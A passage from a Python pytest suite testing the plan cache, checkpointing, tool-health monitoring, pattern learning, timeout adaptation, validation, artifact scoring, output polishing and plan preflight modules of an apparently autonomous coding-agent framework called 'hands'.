        assert cache.get("Build API", "python") is not None
        assert cache.get("Build API", "rust") is None

    def test_expiry(self, tmp_path):
        """Expired entries are evicted."""
        from hands.plan_cache import PlanCache
        import datetime as dt
        cache = PlanCache(str(tmp_path / "cache.json"))

        cache.put("Old task", "test", {"steps": []}, score=8.0)
        # Manually backdate the entry
        for key in cache._cache:
            cache._cache[key]["cached_at"] = "2020-01-01T00:00:00+00:00"
        cache._save()

        result = cache.get("Old task", "test")
        assert result is None  # Expired

    def test_stats(self, tmp_path):
        """Cache stats returns correct counts."""
        from hands.plan_cache import PlanCache
        cache = PlanCache(str(tmp_path / "cache.json"))

        cache.put("Task A", "domain1", {"steps": []}, score=7.0)
        cache.put("Task B", "domain2", {"steps": []}, score=8.0)

        stats = cache.stats()
        assert stats["entries"] == 2
        assert set(stats["domains"]) == {"domain1", "domain2"}

    def test_clear(self, tmp_path):
        """Cache clear removes entries."""
        from hands.plan_cache import PlanCache
        cache = PlanCache(str(tmp_path / "cache.json"))

        cache.put("Task A", "d1", {"steps": []}, score=7.0)
        cache.put("Task B", "d2", {"steps": []}, score=7.0)

        count = cache.clear("d1")
        assert count == 1
        assert cache.stats()["entries"] == 1

    def test_lru_eviction(self, tmp_path):
        """Cache evicts LRU entries when over capacity."""
        from hands.plan_cache import PlanCache, MAX_CACHE_ENTRIES
        cache = PlanCache(str(tmp_path / "cache.json"))

        # Fill past capacity
        for i in range(MAX_CACHE_ENTRIES + 5):
            cache.put(f"Task {i}", "test", {"steps": []}, score=7.0)

        assert cache.stats()["entries"] <= MAX_CACHE_ENTRIES


# ============================================================
# v8: Execution Checkpoint
# ============================================================

class TestCheckpoint:
    """Test execution checkpointing for crash recovery."""

    def test_create_and_load(self, tmp_path):
        """Checkpoint creates and loads correctly."""
        from hands.checkpoint import ExecutionCheckpoint
        cp = ExecutionCheckpoint(str(tmp_path))

        cp.create("test-domain", "Build API", {"steps": [{"step": 1}]})
        loaded = cp.load("test-domain")

        assert loaded is not None
        assert loaded["goal"] == "Build API"
        assert loaded["status"] == "in_progress"

    def test_update_step(self, tmp_path):
        """Steps are recorded in checkpoint."""
        from hands.checkpoint import ExecutionCheckpoint
        cp = ExecutionCheckpoint(str(tmp_path))

        cp.create("test", "Build API", {"steps": []})
        cp.update_step("test", {"step": 1, "success": True, "artifacts": ["file.ts"]})
        cp.update_step("test", {"step": 2, "success": True, "artifacts": ["file2.ts"]})

        loaded = cp.load("test")
        assert len(loaded["completed_steps"]) == 2
        assert len(loaded["artifacts"]) == 2

    def test_clear(self, tmp_path):
        """Clear removes checkpoint file."""
        from hands.checkpoint import ExecutionCheckpoint
        cp = ExecutionCheckpoint(str(tmp_path))

        cp.create("test", "Task", {"steps": []})
        assert cp.load("test") is not None

        cp.clear("test")
        assert cp.load("test") is None

    def test_mark_complete(self, tmp_path):
        """mark_complete changes status."""
        from hands.checkpoint import ExecutionCheckpoint
        cp = ExecutionCheckpoint(str(tmp_path))

        cp.create("test", "Task", {"steps": []})
        cp.mark_complete("test", success=True)

        # Completed checkpoints are not returned by load (status != in_progress)
        assert cp.load("test") is None

    def test_list_active(self, tmp_path):
        """list_active returns all in-progress checkpoints."""
        from hands.checkpoint import ExecutionCheckpoint
        cp = ExecutionCheckpoint(str(tmp_path))

        cp.create("domain1", "Task 1", {"steps": []})
        cp.create("domain2", "Task 2", {"steps": []})
        cp.mark_complete("domain2", True)

        active = cp.list_active()
        assert len(active) == 1
        assert active[0]["domain"] == "domain1"

    def test_get_resume_info(self, tmp_path):
        """get_resume_info returns data needed for resumption."""
        from hands.checkpoint import ExecutionCheckpoint
        cp = ExecutionCheckpoint(str(tmp_path))

        cp.create("test", "Build API", {"steps": [1, 2, 3]})
        cp.update_step("test", {"step": 1, "success": True, "artifacts": ["a.ts"]})
        cp.update_step("test", {"step": 2, "success": True, "artifacts": ["b.ts"]})

        info = cp.get_resume_info("test")
        assert info is not None
        assert info["completed_step_count"] == 2
        assert len(info["artifacts"]) == 2

    def test_no_resume_without_steps(self, tmp_path):
        """No resume info when no steps completed."""
        from hands.checkpoint import ExecutionCheckpoint
        cp = ExecutionCheckpoint(str(tmp_path))

        cp.create("test", "Task", {"steps": []})
        assert cp.get_resume_info("test") is None


# ============================================================
# v8: Tool Health Monitor
# ============================================================

class TestToolHealth:
    """Test tool health monitoring and degradation detection."""

    def test_healthy_tool(self):
        """Tools with high success rate are not degraded."""
        from hands.tool_health import ToolHealthMonitor
        monitor = ToolHealthMonitor()
        monitor.record("code", True)
        monitor.record("code", True)
        monitor.record("code", True)
        assert not monitor.is_degraded("code")
        assert monitor.get_failure_rate("code") == 0.0

    def test_degraded_tool(self):
        """Tools with high failure rate are marked degraded."""
        from hands.tool_health import ToolHealthMonitor
        monitor = ToolHealthMonitor()
        monitor.record("terminal", False, "timeout")
        monitor.record("terminal", False, "timeout")
        monitor.record("terminal", False, "timeout")
        assert monitor.is_degraded("terminal")
        assert monitor.get_failure_rate("terminal") == 1.0

    def test_not_degraded_with_few_attempts(self):
        """Degradation requires minimum attempts."""
        from hands.tool_health import ToolHealthMonitor
        monitor = ToolHealthMonitor()
        monitor.record("git", False, "error")
        monitor.record("git", False, "error")
        # Only 2 attempts — below MIN_ATTEMPTS_FOR_DEGRADATION (3)
        assert not monitor.is_degraded("git")

    def test_alternatives(self):
        """Get alternatives for degraded tools."""
        from hands.tool_health import ToolHealthMonitor
        monitor = ToolHealthMonitor()
        alts = monitor.get_alternatives("terminal")
        assert len(alts) > 0
        assert any("code" in a.lower() for a in alts)

    def test_health_report(self):
        """Health report includes all monitored tools."""
        from hands.tool_health import ToolHealthMonitor
        monitor = ToolHealthMonitor()
        monitor.record("code", True)
        monitor.record("terminal", False, "err")
        monitor.record("terminal", False, "err")
        monitor.record("terminal", False, "err")

        report = monitor.get_health_report()
        assert "code" in report
        assert "terminal" in report
        assert report["terminal"]["degraded"] is True
        assert report["code"]["degraded"] is False

    def test_health_context_empty_when_healthy(self):
        """No context string when all tools are healthy."""
        from hands.tool_health import ToolHealthMonitor
        monitor = ToolHealthMonitor()
        monitor.record("code", True)
        assert monitor.get_health_context() == ""

    def test_health_context_with_degraded(self):
        """Context string generated when tools are degraded."""
        from hands.tool_health import ToolHealthMonitor
        monitor = ToolHealthMonitor()
        for _ in range(4):
            monitor.record("terminal", False, "timeout")

        ctx = monitor.get_health_context()
        assert "terminal" in ctx
        assert "WARNINGS" in ctx

    def test_reset(self):
        """Reset clears all health data."""
        from hands.tool_health import ToolHealthMonitor
        monitor = ToolHealthMonitor()
        monitor.record("code", True)
        monitor.reset()
        assert monitor.get_health_report() == {}

    def test_unknown_tool_not_degraded(self):
        """Unknown tools are not considered degraded."""
        from hands.tool_health import ToolHealthMonitor
        monitor = ToolHealthMonitor()
        assert not monitor.is_degraded("nonexistent")
        assert monitor.get_failure_rate("nonexistent") == 0.0


# ============================================================
# v9: Pattern Learner
# ============================================================

class TestPatternLearner:
    """Test execution pattern learning and lesson distillation."""

    def _make_exec_output(self, score=7.0, accepted=True, step_results=None, domain="test"):
        """Helper to create mock execution output."""
        if step_results is None:
            step_results = [
                {"step": 1, "tool": "code", "success": True, "error": ""},
                {"step": 2, "tool": "terminal", "success": True, "error": ""},
            ]
        return {
            "domain": domain,
            "goal": "Build a test project",
            "overall_score": score,
            "accepted": accepted,
            "execution_report": {"step_results": step_results},
            "plan": {"steps": [{"step": 1}, {"step": 2}]},
            "validation": {"weaknesses": [], "strengths": []},
        }

    def test_analyze_extracts_lessons(self, tmp_path):
        """analyze_execution extracts patterns from execution data."""
        from hands.pattern_learner import PatternLearner
        learner = PatternLearner(str(tmp_path / "patterns.json"))

        output = self._make_exec_output(score=5.0, accepted=False, step_results=[
            {"step": 1, "tool": "terminal", "success": False, "error": "ENOENT: no such file"},
            {"step": 2, "tool": "code", "success": True, "error": ""},
        ])

        lessons = learner.analyze_execution(output)
        assert len(lessons) > 0

    def test_consecutive_failures_detected(self, tmp_path):
        """Detects consecutive failure patterns."""
        from hands.pattern_learner import PatternLearner
        learner = PatternLearner(str(tmp_path / "patterns.json"))

        output = self._make_exec_output(score=4.0, accepted=False, step_results=[
            {"step": 1, "tool": "terminal", "success": False, "error": "timeout"},
            {"step": 2, "tool": "terminal", "success": False, "error": "timeout"},
            {"step": 3, "tool": "terminal", "success": False, "error": "timeout"},
        ])

        lessons = learner.analyze_execution(output)
        assert any("consecutive" in l.lower() or "terminal" in l.lower() for l in lessons)

    def test_persistence(self, tmp_path):
        """Lessons persist across instances."""
        from hands.pattern_learner import PatternLearner
        path = str(tmp_path / "patterns.json")

        learner1 = PatternLearner(path)
        output = self._make_exec_output(score=4.0, accepted=False, step_results=[
            {"step": 1, "tool": "terminal", "success": False, "error": "ENOENT error"},
            {"step": 2, "tool": "code", "success": True, "error": ""},
        ])
        learner1.analyze_execution(output)

        learner2 = PatternLearner(path)
        assert len(learner2._lessons) > 0

    def test_evidence_accumulation(self, tmp_path):
        """Same pattern appearing multiple times increases evidence count."""
        from hands.pattern_learner import PatternLearner
        learner = PatternLearner(str(tmp_path / "patterns.json"))

        for _ in range(3):
            output = self._make_exec_output(score=5.0, step_results=[
                {"step": 1, "tool": "terminal", "success": False, "error": "ENOENT"},
                {"step": 2, "tool": "code", "success": True, "error": ""},
            ])
            learner.analyze_execution(output)

        enoent_lessons = [l for l in learner._lessons if "ENOENT" in l.pattern or "missing_file" in l.pattern]
        assert len(enoent_lessons) > 0
        assert enoent_lessons[0].evidence_count >= 3

    def test_format_for_prompt(self, tmp_path):
        """format_lessons_for_prompt creates injectable text."""
        from hands.pattern_learner import PatternLearner
        learner = PatternLearner(str(tmp_path / "patterns.json"))

        for _ in range(3):
            learner.analyze_execution(self._make_exec_output(
                score=4.0, step_results=[
                    {"step": 1, "tool": "terminal", "success": False, "error": "ENOENT"},
                    {"step": 2, "tool": "code", "success": True, "error": ""},
                ]))

        text = learner.format_lessons_for_prompt(domain="test")
        if text:
            assert "LESSONS" in text

    def test_stats(self, tmp_path):
        """Stats returns correct information."""
        from hands.pattern_learner import PatternLearner
        learner = PatternLearner(str(tmp_path / "patterns.json"))

        learner.analyze_execution(self._make_exec_output(
            score=4.0, step_results=[
                {"step": 1, "tool": "terminal", "success": False, "error": "timeout"},
            ]))

        stats = learner.stats()
        assert stats["total_lessons"] > 0

    def test_plan_explosion_detected(self, tmp_path):
        """Detects when execution uses far more steps than planned."""
        from hands.pattern_learner import PatternLearner
        learner = PatternLearner(str(tmp_path / "patterns.json"))

        output = self._make_exec_output(score=5.0)
        output["execution_report"]["step_results"] = [
            {"step": i, "tool": "code", "success": True, "error": ""}
            for i in range(1, 7)
        ]
        output["plan"] = {"steps": [{"step": 1}, {"step": 2}]}

        lessons = learner.analyze_execution(output)
        assert any("explosion" in l.lower() or "plan" in l.lower() for l in lessons)

    def test_empty_execution_no_crash(self, tmp_path):
        """Analyzing empty execution doesn't crash."""
        from hands.pattern_learner import PatternLearner
        learner = PatternLearner(str(tmp_path / "patterns.json"))

        output = {"domain": "test", "execution_report": {}, "plan": {}, "validation": {}}
        lessons = learner.analyze_execution(output)
        assert lessons == []


# ============================================================
# v10: Timeout Adapter, Mid-Execution Gates, Surgical Retry
# ============================================================

class TestTimeoutAdapter:
    """Test adaptive per-tool timeout calculation."""

    def test_default_timeout(self):
        """Falls back to global default for unknown tools."""
        from hands.timeout_adapter import TimeoutAdapter
        adapter = TimeoutAdapter(global_default=120)
        assert adapter.suggest("unknown_tool") == 120

    def test_tool_specific_default(self):
        """Uses tool-specific defaults when no history exists."""
        from hands.timeout_adapter import TimeoutAdapter
        adapter = TimeoutAdapter()
        assert adapter.suggest("terminal") == 120
        assert adapter.suggest("code") == 30

    def test_slow_command_detection(self):
        """Detects known slow commands and returns higher timeout."""
        from hands.timeout_adapter import TimeoutAdapter
        adapter = TimeoutAdapter()
        t = adapter.suggest("terminal", {"command": "npm install --save react"})
        assert t >= 180

    def test_history_based_timeout(self):
        """Calculates timeout from historical durations."""
        from hands.timeout_adapter import TimeoutAdapter
        adapter = TimeoutAdapter(global_default=120)
        # Record 5 durations of ~10s each
        for _ in range(5):
            adapter.record("code", 10.0)
        suggested = adapter.suggest("code")
        # Should be ~25s (10 * 2.5 multiplier)
        assert 20 <= suggested <= 50

    def test_record_and_stats(self):
        """Stats correctly summarize recorded durations."""
        from hands.timeout_adapter import TimeoutAdapter
        adapter = TimeoutAdapter()
        adapter.record("terminal", 5.0)
        adapter.record("terminal", 15.0)
        adapter.record("terminal", 10.0)
        stats = adapter.stats()
        assert "terminal" in stats
        assert stats["terminal"]["samples"] == 3
        assert stats["terminal"]["avg_s"] == 10.0

    def test_max_timeout_cap(self):
        """Timeout never exceeds MAX_TIMEOUT."""
        from hands.timeout_adapter import TimeoutAdapter
        adapter = TimeoutAdapter()
        # Record huge durations
        for _ in range(5):
            adapter.record("terminal", 500.0)
        assert adapter.suggest("terminal") <= 600

    def test_min_timeout_floor(self):
        """Timeout never goes below MIN_TIMEOUT."""
        from hands.timeout_adapter import TimeoutAdapter
        adapter = TimeoutAdapter()
        for _ in range(5):
            adapter.record("code", 0.01)
        assert adapter.suggest("code") >= 10


class TestMidValidator:
    """Test mid-execution quality gates."""

    def _make_plan(self, step_count=5, with_setup=True):
        """Create a test plan with optional setup step."""
        steps = []
        for i in range(1, step_count + 1):
            step = {
                "step_number": i,
                "tool": "code",
                "params": {"path": f"src/file{i}.py", "action": "write"},
                "depends_on": [i - 1] if i > 1 else [],
                "description": f"Write file {i}",
            }
            if with_setup and i == 1:
                step["params"]["path"] = "package.json"
                step["description"] = "Setup package.json"
            steps.append(step)
        return {"steps": steps, "task_summary": "test plan"}

    def test_gate_points_setup(self):
        """Gate points include setup steps."""
        from hands.mid_validator import MidExecutionValidator
        plan = self._make_plan(5, with_setup=True)
        mv = MidExecutionValidator(plan)
        assert 1 in mv.gate_points  # package.json step

    def test_gate_points_midpoint(self):
        """Gate at midpoint for large plans."""
        from hands.mid_validator import MidExecutionValidator
        plan = self._make_plan(10, with_setup=False)
        mv = MidExecutionValidator(plan)
        assert 5 in mv.gate_points  # midpoint of 10 steps

    def test_no_gate_on_failure(self):
        """Don't gate on failed steps."""
        from hands.mid_validator import MidExecutionValidator
        plan = self._make_plan(5)
        mv = MidExecutionValidator(plan)
        assert mv.should_gate(1, {"success": True}) or 1 not in mv.gate_points
        assert not mv.should_gate(1, {"success": False})

    def test_quick_validate_missing_file(self, tmp_path):
        """Detects artifact files that don't exist."""
        from hands.mid_validator import MidExecutionValidator
        plan = self._make_plan(3)
        mv = MidExecutionValidator(plan)
        issues = mv.quick_validate([str(tmp_path / "nonexistent.py")])
        assert len(issues) == 1
        assert issues[0]["check"] == "exists"

    def test_quick_validate_empty_file(self, tmp_path):
        """Detects empty files."""
        from hands.mid_validator import MidExecutionValidator
        plan = self._make_plan(3)
        mv = MidExecutionValidator(plan)
        empty_file = tmp_path / "empty.json"
        empty_file.write_text("")
        issues = mv.quick_validate([str(empty_file)])
        assert any(i["check"] == "not_empty" for i in issues)

    def test_quick_validate_invalid_json(self, tmp_path):
        """Detects invalid JSON files."""
        from hands.mid_validator import MidExecutionValidator
        plan = self._make_plan(3)
        mv = MidExecutionValidator(plan)
        bad_json = tmp_path / "config.json"
        bad_json.write_text("{invalid json!")
        issues = mv.quick_validate([str(bad_json)])
        assert any(i["check"] == "json_valid" for i in issues)

    def test_quick_validate_valid_files(self, tmp_path):
        """No issues for valid files."""
        from hands.mid_validator import MidExecutionValidator
        plan = self._make_plan(3)
        mv = MidExecutionValidator(plan)
        good = tmp_path / "config.json"
        good.write_text('{"name": "test"}')
        issues = mv.quick_validate([str(good)])
        assert len(issues) == 0

    def test_correction_prompt(self):
        """Generates correction prompt from issues."""
        from hands.mid_validator import MidExecutionValidator
        plan = self._make_plan(3)
        mv = MidExecutionValidator(plan)
        prompt = mv.get_correction_prompt([
            {"file": "/path/to/file.json", "check": "json_valid", "detail": "Bad JSON"}
        ])
        assert "QUALITY CHECK" in prompt
        assert "json_valid" in prompt

    def test_avoids_rechecking_artifacts(self, tmp_path):
        """Doesn't re-check artifacts that were already validated."""
        from hands.mid_validator import MidExecutionValidator
        plan = self._make_plan(3)
        mv = MidExecutionValidator(plan)
        good = tmp_path / "file.json"
        good.write_text('{"ok": true}')
        mv.quick_validate([str(good)])
        # Second call with same file should return no issues
        issues = mv.quick_validate([str(good)])
        assert len(issues) == 0

    def test_fan_out_detection(self):
        """Steps depended on by 2+ others are gate points."""
        from hands.mid_validator import MidExecutionValidator
        plan = {
            "steps": [
                {"step_number": 1, "tool": "code", "params": {}, "depends_on": [], "description": "base"},
                {"step_number": 2, "tool": "code", "params": {}, "depends_on": [1], "description": "a"},
                {"step_number": 3, "tool": "code", "params": {}, "depends_on": [1], "description": "b"},
                {"step_number": 4, "tool": "code", "params": {}, "depends_on": [1], "description": "c"},
            ]
        }
        mv = MidExecutionValidator(plan)
        assert 1 in mv.gate_points  # Step 1 is depended on by 3 others


class TestIdentifyFailingSteps:
    """Test surgical retry step identification."""

    def test_identifies_failed_required_steps(self):
        """Finds steps that explicitly failed."""
        from hands.validator import identify_failing_steps
        validation = {"critical_issues": [], "weaknesses": [], "static_checks": {"issues": []}}
        step_results = [
            {"step": 1, "tool": "code", "success": True, "artifacts": [], "criticality": "required"},
            {"step": 2, "tool": "terminal", "success": False, "artifacts": [], "error": "timeout", "criticality": "required"},
            {"step": 3, "tool": "code", "success": True, "artifacts": [], "criticality": "required"},
        ]
        plan_steps = [
            {"step_number": 1, "depends_on": []},
            {"step_number": 2, "depends_on": [1]},
            {"step_number": 3, "depends_on": [2]},
        ]
        failing = identify_failing_steps(validation, step_results, plan_steps)
        assert 2 in failing
        assert 3 in failing  # Depends on step 2

    def test_identifies_static_check_failures(self):
        """Maps static check issues to their creating step."""
        from hands.validator import identify_failing_steps
        validation = {
            "critical_issues": [],
            "weaknesses": [],
            "static_checks": {
                "issues": [{"file": "/path/to/broken.json", "check": "json_valid", "detail": "bad"}]
            },
        }
        step_results = [
            {"step": 1, "tool": "code", "success": True, "artifacts": ["/path/to/broken.json"], "criticality": "required"},
            {"step": 2, "tool": "code", "success": True, "artifacts": ["/path/to/good.py"], "criticality": "required"},
        ]
        plan_steps = [
            {"step_number": 1, "depends_on": []},
            {"step_number": 2, "depends_on": []},
        ]
        failing = identify_failing_steps(validation, step_results, plan_steps)
        assert 1 in failing
        assert 2 not in failing

    def test_skips_optional_failures(self):
        """Optional step failures don't trigger surgical retry."""
        from hands.validator import identify_failing_steps
        validation = {"critical_issues": [], "weaknesses": [], "static_checks": {"issues": []}}
        step_results = [
            {"step": 1, "tool": "terminal", "success": False, "artifacts": [], "criticality": "optional"},
        ]
        plan_steps = [{"step_number": 1, "depends_on": []}]
        failing = identify_failing_steps(validation, step_results, plan_steps)
        assert 1 not in failing

    def test_empty_inputs_no_crash(self):
        """Handles empty inputs gracefully."""
        from hands.validator import identify_failing_steps
        failing = identify_failing_steps(
            {"critical_issues": [], "weaknesses": [], "static_checks": {"issues": []}},
            [], [],
        )
        assert failing == []


# ============================================================
# v11: Artifact Tracker, Code Exemplars, Output Polisher
# ============================================================

class TestArtifactTracker:
    """Test per-file/archetype quality tracking."""

    def test_classify_archetype_exact(self):
        from hands.artifact_tracker import classify_archetype
        assert classify_archetype("package.json") == "config/package-json"
        assert classify_archetype("tsconfig.json") == "config/tsconfig"

    def test_classify_archetype_test(self):
        from hands.artifact_tracker import classify_archetype
        assert classify_archetype("src/App.test.tsx") == "test/react"
        assert classify_archetype("tests/test_api.py") == "test/python"

    def test_classify_archetype_extension(self):
        from hands.artifact_tracker import classify_archetype
        assert classify_archetype("src/utils.ts") == "source/typescript"
        assert classify_archetype("src/Button.tsx") == "component/react"

    def test_score_artifacts_basic(self):
        from hands.artifact_tracker import score_artifacts
        validation = {
            "overall_score": 7.0,
            "weaknesses": [],
            "critical_issues": [],
            "strengths": [],
            "static_checks": {"issues": []},
        }
        step_results = [
            {"step": 1, "tool": "code", "success": True, "artifacts": ["/path/to/file.ts"]},
        ]
        scored = score_artifacts(validation, step_results, ["/path/to/file.ts"])
        assert len(scored) == 1
        assert scored[0]["inferred_score"] == 7.0
        assert scored[0]["archetype"] == "source/typescript"

    def test_score_artifacts_failed_step_penalty(self):
        from hands.artifact_tracker import score_artifacts
        validation = {
            "overall_score": 7.0, "weaknesses": [], "critical_issues": [],
            "strengths": [], "static_checks": {"issues": []},
        }
        step_results = [
            {"step": 1, "tool": "code", "success": False, "artifacts": ["/path/file.py"]},
        ]
        scored = score_artifacts(validation, step_results, ["/path/file.py"])
        assert scored[0]["inferred_score"] < 7.0

    def test_quality_db_update_and_query(self, tmp_path):
        from hands.artifact_tracker import ArtifactQualityDB
        db = ArtifactQualityDB(str(tmp_path / "quality.json"))
        db.update("test-domain", [
            {"archetype": "source/typescript", "inferred_score": 5.0, "issues": ["syntax"]},
            {"archetype": "source/typescript", "inferred_score": 4.0, "issues": ["syntax"]},
            {"archetype": "config/tsconfig", "inferred_score": 9.0, "issues": []},
            {"archetype": "config/tsconfig", "inferred_score": 8.5, "issues": []},
        ])
        weak = db.get_weak_archetypes("test-domain", threshold=6.5)
        assert any(w["archetype"] == "source/typescript" for w in weak)
        strong = db.get_strong_archetypes("test-domain", threshold=7.5)
        assert any(s["archetype"] == "config/tsconfig" for s in strong)

    def test_quality_db_persistence(self, tmp_path):
        from hands.artifact_tracker import ArtifactQualityDB
        path = str(tmp_path / "quality.json")
        db1 = ArtifactQualityDB(path)
        db1.update("d", [{"archetype": "source/python", "inferred_score": 6.0, "issues": []}])
        db2 = ArtifactQualityDB(path)
        summary = db2.get_domain_summary("d")
        assert summary["archetypes"] == 1

    def test_format_for_prompt(self, tmp_path):
        from hands.artifact_tracker import ArtifactQualityDB
        db = ArtifactQualityDB(str(tmp_path / "q.json"))
        db.update("d", [
            {"archetype": "test/python", "inferred_score": 4.0, "issues": ["incomplete"]},
            {"archetype": "test/python", "inferred_score": 3.5, "issues": ["incomplete"]},
        ])
        text = db.format_for_prompt("d")
        assert "QUALITY WARNINGS" in text
        assert "test/python" in text


class TestCodeExemplars:
    """Test code exemplar storage and retrieval."""

    def test_extract_and_store(self, tmp_path):
        from hands.code_exemplars import CodeExemplarStore
        store = CodeExemplarStore(str(tmp_path / "exemplars.json"))
        # Create a real file
        code_file = tmp_path / "good_code.ts"
        code_file.write_text("export const add = (a: number, b: number): number => a + b;\n")
        scored = [
            {"filepath": str(code_file), "archetype": "source/typescript", "inferred_score": 8.0, "step_success": True},
        ]
        count = store.extract_and_store("test", scored)
        assert count == 1

    def test_get_exemplars(self, tmp_path):
        from hands.code_exemplars import CodeExemplarStore
        store = CodeExemplarStore(str(tmp_path / "exemplars.json"))
        code_file = tmp_path / "good.ts"
        code_file.write_text("const x = 1;\n")
        store.extract_and_store("test", [
            {"filepath": str(code_file), "archetype": "source/typescript", "inferred_score": 8.0, "step_success": True},
        ])
        exemplars = store.get_exemplars("test", archetypes=["source/typescript"])
        assert len(exemplars) == 1
        assert exemplars[0]["score"] == 8.0

    def test_higher_score_replaces(self, tmp_path):
        from hands.code_exemplars import CodeExemplarStore
        store = CodeExemplarStore(str(tmp_path / "exemplars.json"))
        f1 = tmp_path / "v1.ts"
        f1.write_text("version 1\n")
        f2 = tmp_path / "v2.ts"
        f2.write_text("version 2\n")
        store.extract_and_store("test", [
            {"filepath": str(f1), "archetype": "source/typescript", "inferred_score": 7.0, "step_success": True},
        ])
        store.extract_and_store("test", [
            {"filepath": str(f2), "archetype": "source/typescript", "inferred_score": 9.0, "step_success": True},
        ])
        exemplars = store.get_exemplars("test")
        assert "version 2" in exemplars[0]["content"]

    def test_format_for_prompt(self, tmp_path):
        from hands.code_exemplars import CodeExemplarStore
        store = CodeExemplarStore(str(tmp_path / "exemplars.json"))
        f = tmp_path / "good.py"
        f.write_text("def hello(): pass\n")
        store.extract_and_store("test", [
            {"filepath": str(f), "archetype": "source/python", "inferred_score": 8.0, "step_success": True},
        ])
        text = store.format_for_prompt(store.get_exemplars("test"))
        assert "HIGH-SCORING" in text
        assert "hello" in text

    def test_predict_archetypes(self, tmp_path):
        from hands.code_exemplars import CodeExemplarStore
        store = CodeExemplarStore(str(tmp_path / "exemplars.json"))
        plan = {
            "steps": [
                {"params": {"path": "package.json"}},
                {"params": {"path": "src/index.ts"}},
                {"params": {"path": "tests/index.test.ts"}},
            ]
        }
        archetypes = store.predict_archetypes(plan)
        assert "config/package-json" in archetypes
        assert "source/typescript" in archetypes
        assert "test/typescript" in archetypes

    def test_stats(self, tmp_path):
        from hands.code_exemplars import CodeExemplarStore
        store = CodeExemplarStore(str(tmp_path / "exemplars.json"))
        stats = store.stats("empty-domain")
        assert stats["total_exemplars"] == 0

    def test_min_score_filter(self, tmp_path):
        from hands.code_exemplars import CodeExemplarStore
        store = CodeExemplarStore(str(tmp_path / "exemplars.json"))
        f = tmp_path / "bad.ts"
        f.write_text("bad code\n")
        count = store.extract_and_store("test", [
            {"filepath": str(f), "archetype": "source/typescript", "inferred_score": 3.0, "step_success": True},
        ])
        assert count == 0  # Below MIN_SCORE_TO_STORE


class TestOutputPolisher:
    """Test zero-cost rule-based output polishing."""

    def test_adds_trailing_newline(self, tmp_path):
        from hands.output_polisher import polish_artifacts
        f = tmp_path / "file.py"
        f.write_text("x = 1")  # No trailing newline
        result = polish_artifacts([str(f)])
        assert result["files_modified"] == 1
        assert f.read_text().endswith("\n")

    def test_fixes_trailing_commas_json(self, tmp_path):
        from hands.output_polisher import polish_artifacts
        f = tmp_path / "config.json"
        f.write_text('{"a": 1, "b": 2,}')
        result = polish_artifacts([str(f)])
        assert result["files_modified"] >= 1
        import json
        data = json.loads(f.read_text())
        assert data == {"a": 1, "b": 2}

    def test_adds_package_json_fields(self, tmp_path):
        from hands.output_polisher import polish_artifacts
        f = tmp_path / "package.json"
        f.write_text('{"dependencies": {}}')
        result = polish_artifacts([str(f)])
        import json
        data = json.loads(f.read_text())
        assert "name" in data
        assert "version" in data

    def test_removes_null_bytes(self, tmp_path):
        from hands.output_polisher import polish_artifacts
        f = tmp_path / "file.py"
        f.write_text("x = 1\x00\n")
        result = polish_artifacts([str(f)])
        assert "\x00" not in f.read_text()

    def test_trims_excess_blank_lines(self, tmp_path):
        from hands.output_polisher import polish_artifacts
        f = tmp_path / "file.py"
        f.write_text("x = 1\n\n\n\n\n")
        result = polish_artifacts([str(f)])
        content = f.read_text()
        assert content.count("\n\n\n") == 0

    def test_skips_binary_extensions(self, tmp_path):
        from hands.output_polisher import polish_artifacts
        f = tmp_path / "image.png"
        f.write_bytes(b"\x89PNG")
        result = polish_artifacts([str(f)])
        assert result["files_checked"] == 0

    def test_no_change_for_clean_files(self, tmp_path):
        from hands.output_polisher import polish_artifacts
        f = tmp_path / "clean.py"
        f.write_text("x = 1\n")
        result = polish_artifacts([str(f)])
        assert result["files_modified"] == 0

    def test_format_polish_log(self):
        from hands.output_polisher import format_polish_log
        result = {"files_modified": 2, "fixes": [
            {"file": "/path/to/file.json", "fix": "reformatted_json"},
            {"file": "/path/to/main.py", "fix": "added_trailing_newline"},
        ]}
        log = format_polish_log(result)
        assert "[POLISHER]" in log
        assert "reformatted_json" in log


# ==========================
# v12 — Plan Pre-Flight Validator Tests
# ==========================

class TestPlanPreflight:
    """Tests for hands/plan_preflight.py"""

    def test_imports(self):
        from hands.plan_preflight import preflight_check, PreflightResult, PreflightIssue
        assert callable(preflight_check)

    def test_empty_plan_is_blocker(self):
        from hands.plan_preflight import preflight_check
        result = preflight_check({"steps": []})
        assert not result.passed
        assert len(result.blockers) == 1
        assert "no steps" in result.blockers[0].message.lower()

    def test_valid_plan_passes(self):
        from hands.plan_preflight import preflight_check
        plan = {"steps": [
            {"step_number": 1, "tool": "code", "params": {"path": "src/index.ts", "action": "write"}, "description": "Create main file", "depends_on": []},
            {"step_number": 2, "tool": "terminal", "params": {"command": "npm test"}, "description": "Run tests", "depends_on": [1]},
        ]}
        result = preflight_check(plan)
        assert result.passed

    def test_forward_dependency_is_blocker(self):
        from hands.plan_preflight import preflight_check
        plan = {"steps": [
            {"step_number": 1, "tool": "code", "depends_on": [2], "params": {}},
            {"step_number": 2, "tool": "code", "depends_on": [], "params": {}},
        ]}
        result = preflight_check(plan)
        assert any(i.category == "ordering" and i.severity == "blocker" for i in result.issues)

    def test_nonexistent_dependency_warning(self):
        from hands.plan_preflight import preflight_check
        plan = {"steps": [
            {"step_number": 1, "tool": "code", "depends_on": [99], "params": {}},
        ]}
        result = preflight_check(plan)
        assert any(i.category == "ordering" and "non-existent" in i.message for i in result.issues)

    def test_config_after_source_warning(self):
        from hands.plan_preflight import preflight_check
        plan = {"steps": [
            {"step_number": 1, "tool": "code", "params": {"path": "src/main.ts"}, "depends_on": []},
            {"step_number": 2, "tool": "code", "params": {"path": "package.json"}, "depends_on": []},
        ]}
        result = preflight_check(plan)
        assert any(i.category == "ordering" and "config" in i.message.lower() for i in result.issues)

    def test_all_code_tool_warning(self):
        from hands.plan_preflight import preflight_check
        plan = {"steps": [
            {"step_number": i, "tool": "code", "params": {}, "depends_on": []}
            for i in range(1, 5)
        ]}
        result = preflight_check(plan)
        assert any(i.category == "diversity" for i in result.issues)

    def test_duplicate_action_warning(self):
        from hands.plan_preflight import preflight_check
        plan = {"steps": [
            {"step_number": 1, "tool": "code", "params": {"path": "src/app.ts", "action": "write"}, "depends_on": []},
            {"step_number": 2, "tool": "code", "params": {"path": "src/app.ts", "action": "write"}, "depends_on": []},
        ]}
        result = preflight_check(plan)
        assert any(i.category == "duplicate" for i in result.issues)

    def test_no_verification_step_warning(self):
        from hands.plan_preflight import preflight_check
        plan = {"steps": [
